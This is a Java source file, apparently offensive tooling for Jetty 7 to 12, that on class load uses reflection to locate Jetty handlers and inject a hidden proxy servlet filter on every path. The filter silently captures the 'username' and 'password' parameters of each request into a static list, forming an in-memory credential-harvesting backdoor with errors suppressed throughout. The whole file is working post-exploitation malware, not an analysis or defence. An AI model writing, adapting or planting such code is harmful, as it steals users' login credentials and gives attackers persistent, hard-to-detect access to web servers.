import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashSet;

//jetty7-12 test
public class RecordPassword extends ClassLoader implements InvocationHandler {

    public static ArrayList userinfo = new ArrayList<>();


    static {
        new RecordPassword().addFilter();
    }

    public RecordPassword(ClassLoader loader) {
        super(loader);
    }

    public RecordPassword() {

    }

    private void addFilter() {
        try {
            addFilter(this);
        } catch (Throwable e) {

        }
    }

    private Class loadClasses(String className) throws ClassNotFoundException {
        ArrayList classLoaders = new ArrayList();
        classLoaders.add(this.getClass().getClassLoader());
        try {
            classLoaders.add(Thread.currentThread().getContextClassLoader());
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            int threadCount = threadGroup.activeCount();
            Thread[] threads = new Thread[threadCount];
            threadCount = threadGroup.enumerate(threads);
            for (int i = 0; i < threadCount; i++) {
                classLoaders.add(threads[i].getContextClassLoader());
            }
        } catch (Exception e) {

        }
        int loaders = classLoaders.size();
        for (int i = 0; i < loaders; i++) {
            ClassLoader loader = (ClassLoader) classLoaders.get(i);
            if (loader != null) {
                try {
                    return Class.forName(className, true, loader);
                } catch (Throwable e) {

                }
            }
        }
        return Class.forName(className);
    }


    private Object[] getObjectValues(Object obj, Class clazz) {
        HashSet values = new HashSet();

        try {
            if (clazz == null) {
                clazz = obj.getClass();
            }
            Field[] fields = obj.getClass().getDeclaredFields();

            for (int i = 0; i < fields.length; i++) {
                try {
                    Field field = fields[i];
                    field.setAccessible(true);
                    Object object = field.get(obj);
                    if (object != null) {
                        values.add(object);
                    }
                } catch (Throwable ignored) {

                }
            }
            clazz = clazz.getSuperclass();
            if (clazz != null) {
                getObjectValues(obj, clazz);
            }
        } catch (Throwable ignored) {

        }

        return values.toArray();
    }

    private void getHandles(HashSet handles, Object handle, Class handlerClass) {
        if (handle == null || handles.contains(handle)) {
            return;
        }
        handles.add(handle);

        Object[] objects = getObjectValues(handle, handle.getClass());
        for (int i = 0; i < objects.length; i++) {
            Object object = objects[i];
            if (handlerClass.isInstance(object)) {
                getHandles(handles, object, handlerClass);
            }
        }

        Object newHandleObject = invokeMethod(handle, "getHandlers");
        if (newHandleObject != null) {
            if (Collection.class.isInstance(newHandleObject)) {
                newHandleObject = ((Collection) newHandleObject).toArray();
            }
            if (newHandleObject.getClass().isArray()) {
                int handleSize = Array.getLength(newHandleObject);
                for (int i = 0; i < handleSize; i++) {
                    getHandles(handles, Array.get(newHandleObject, i), handlerClass);
                }
            }
        }
    }

    private Object[] getHandles() {
        HashSet handles = new HashSet();

        try {
            Class contextHandlerClass = loadClasses("org.eclipse.jetty.server.handler.ContextHandler");
            Method getCurrentContextMethod = getMethodByClass(contextHandlerClass, "getCurrentContext");
            Object context = getCurrentContextMethod.invoke(null);

            Object webAppContext = invokeMethod(context, "getContextHandler");
            Object jettyServer = invokeMethod(webAppContext, "getServer");

            Class handlerClass = contextHandlerClass.getClassLoader().loadClass("org.eclipse.jetty.server.Handler");

            getHandles(handles, context, handlerClass);
            getHandles(handles, webAppContext, handlerClass);
            getHandles(handles, jettyServer, handlerClass);

            Thread[] threads = new Thread[Thread.activeCount()];
            Thread.enumerate(threads);
            for (int i = 0; i < threads.length; i++) {
                Thread thread = threads[i];
                if (thread != null) {
                    getHandles(handles, thread.getContextClassLoader(), handlerClass);
                }
            }
        } catch (Throwable e) {

        }
        return handles.toArray();
    }

    private boolean addFilter(InvocationHandler filterInvocationHandler) throws Throwable {
        boolean isOk = false;
        try {
            Object[] obj = getHandles();
            for (int i = 0; i < obj.length; i++) {
                Object handlerObject = obj[i];
                try {
                    Class handlerClass = handlerObject.getClass();
                    Field _filtersField = getField(handlerObject, "_filters");
                    Field _filterMappingsField = getField(handlerObject, "_filterMappings");
                    if (_filtersField == null || _filterMappingsField == null) {
                        continue;
                    }


                    Class filterHolderClass = null;
                    Class filterMappingClass = null;

                    if (_filtersField.getType().isArray()) {
                        filterHolderClass = _filtersField.getType().getComponentType();
                    } else {
                        filterHolderClass = (Class) ((ParameterizedType) _filtersField.getGenericType()).getActualTypeArguments()[0];
                    }

                    if (_filterMappingsField.getType().isArray()) {
                        filterMappingClass = _filterMappingsField.getType().getComponentType();
                    } else {
                        filterMappingClass = (Class) ((ParameterizedType) _filterMappingsField.getGenericType()).getActualTypeArguments()[0];
                    }

                    Class servletRequestFilterClass = null;
                    Constructor filterHolderConstructor = null;
                    try {
                        servletRequestFilterClass = loadClasses("jakarta.servlet.Filter");
                        filterHolderConstructor = filterHolderClass.getConstructor(servletRequestFilterClass);
                    } catch (Exception e) {
                        try {
                            servletRequestFilterClass = loadClasses("javax.servlet.Filter");
                            filterHolderConstructor = filterHolderClass.getConstructor(servletRequestFilterClass);
                        } catch (ClassNotFoundException ex) {

                        }
                    }


                    Object filter = Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(), new Class[]{servletRequestFilterClass}, filterInvocationHandler);
                    Object filterHolder = filterHolderConstructor.newInstance(filter);
                    Object filterMapping = filterMappingClass.newInstance();
                    Method setFilterHolderMethod = filterMappingClass.getDeclaredMethod("setFilterHolder", filterHolderClass);
                    setFilterHolderMethod.setAccessible(true);
                    setFilterHolderMethod.invoke(filterMapping, filterHolder);
                    filterMappingClass.getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{"/*"}});


                    getMethodByClass(handlerClass, "addFilter", filterHolderClass).invoke(handlerObject, filterHolder);
                    getMethodByClass(handlerClass, "prependFilterMapping", filterMappingClass).invoke(handlerObject, filterMapping);
                    isOk = true;
                } catch (Throwable e) {

                }
            }
        } catch (Throwable e) {

        }


        return isOk;
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("doFilter")) {
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            Object filterChain = args[2];
            if (!run(servletRequest, servletResponse)) {
                Class requestClass = method.getParameterTypes()[0];
                Class responseClass = method.getParameterTypes()[1];

                getMethodByClass(filterChain.getClass(), "doFilter", requestClass, responseClass).invoke(filterChain, servletRequest, servletResponse);
            }
        }
        return null;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; i++) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }
            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        } catch (Throwable e) {
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }

        if (method != null) {
            try {
                method.setAccessible(true);
            } catch (Throwable e) {

            }
        }

        return method;
    }

    private static Field getField(Object obj, String fieldName) {
        Class clazz = null;

        if (obj == null) {
            return null;
        }

        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null) {
            field.setAccessible(true);
        }

        return field;
    }

    private String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    private boolean run(Object request, Object response) {
        try {
            try {
                String username = getParameter(request,"username");
                String password = getParameter(request,"password");
                if(username!=null && password!=null){
                    userinfo.add(username+" "+password);
                }

                return false;
            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {

        }
        return false;
    }
}
